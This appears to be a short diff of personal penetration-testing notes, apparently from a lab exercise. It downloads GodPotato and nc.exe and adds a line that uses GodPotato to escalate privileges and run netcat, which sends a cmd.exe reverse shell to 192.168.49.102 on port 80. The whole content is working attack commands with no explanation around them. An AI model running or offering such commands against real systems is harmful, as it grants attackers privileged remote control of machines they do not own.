@@ -50,6 +50,8 @@ curl http://192.168.49.102/GodPotato-NET4.exe -o GodPotato-NET4.exe
 download nc.exe
 https://github.com/int0x33/nc.exe/tree/master
 
+GodPotato-NET4.exe -cmd "nc.exe 192.168.49.102 80 -e cmd.exe"
+
 
 
 
